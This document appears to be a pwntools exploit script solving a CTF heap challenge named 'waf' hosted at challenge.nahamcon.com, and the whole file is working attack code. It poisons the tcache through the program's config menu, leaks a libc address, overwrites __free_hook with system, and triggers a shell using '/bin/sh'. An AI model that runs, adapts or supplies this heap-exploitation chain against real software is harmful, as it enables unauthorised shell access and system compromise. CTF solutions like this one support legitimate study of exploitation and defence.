#!/usr/bin/env python3

from pwn import *

exe = ELF("./waf")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe

r = None

def conn():
    global r
    if args.LOCAL:
        #r = process([exe.path])
        r = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("challenge.nahamcon.com", 32507)

def add_config(str_size, content = b"aaaaaaaa"):
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b": ")
    r.sendline(b"1")
    r.recvuntil(b": ")
    r.sendline(f"{str_size}".encode())
    r.recvuntil(b": ")
    if str_size > 8:
        str_size = 8
    r.sendline(content[:str_size])
    r.recvuntil(b": ")
    r.sendline(b"y")

def edit_config(index, new_size, addr = 1, content = b"bbbbbbbb"):
    r.recvuntil(b"> ")
    r.sendline(b"2")
    r.recvuntil(b": ")
    r.sendline(f"{index}".encode())
    r.recvuntil(b": ")
    r.sendline(f"{addr}".encode())
    r.recvuntil(b": ")
    r.sendline(f"{new_size}".encode())
    r.recvuntil(b": ")
    r.sendline(content)
    print(r.recvuntil(b": "))
    r.sendline(b"y")

def remove_last_config():
    r.recvuntil(b"> ")
    r.sendline(b"4")

def exit():
    r.recvuntil(b"> ")
    r.sendline(b"6")

def print_all_configs():
    r.recvuntil(b"> ")
    r.sendline(b"5")

def print_config_id(index):
    r.recvuntil(b"> ")
    r.sendline(b"3")
    r.recvuntil(b": ")
    r.sendline(f"{index}".encode())
    r.recvuntil(b"ID: ")
    return int(r.recvline().strip())

def print_config_setting(index):
    r.recvuntil(b"> ")
    r.sendline(b"3")
    r.recvuntil(b": ")
    r.sendline(f"{index}".encode())
    r.recvuntil(b"Setting: ")
    resp = r.recvline().strip()
    return u64(resp + b"\x00\x00")

def main():
    conn()
    # good luck pwning :)
    add_config(0x1000, b"")
    add_config(0x10)
    remove_last_config()
    low_addr = print_config_id(1)
    print(f"Low addr of tcache entry is {hex(low_addr)}")
    edit_config(1, 0x80, low_addr - 0x1030, p64(0x2)+p64(0)*4)

    add_config(0x10)#
    edit_config(0, 0x1200)

    libc_leak = print_config_setting(1)
    libc_base = libc_leak - 0x3ebca0
    free_hook = libc_base + 0x3ed8e8
    system = libc_base + 0x4f420
    print(f"Libc base @ {hex(libc_base)}")
    print(f"Libc hook @ {hex(free_hook)}")
    print(f"System @ {hex(system)}")

    #add_config(0x1000, p64(free_hook))
    add_config(0x10, p64(free_hook))
    add_config(0x10)
    remove_last_config()
    low_addr = print_config_id(3)
    print(f"Low addr of tcache entry is {hex(low_addr)}")
    edit_config(3, 0x80, low_addr - 0x40, p64(0x3)+p64(0)*4)
    add_config(0x20)#
    add_config(0x10, p64(system))#
    add_config(0x10, b"/bin/sh")
    remove_last_config()
    #edit_config(0, 12000)

    r.interactive()


if __name__ == "__main__":
    main()
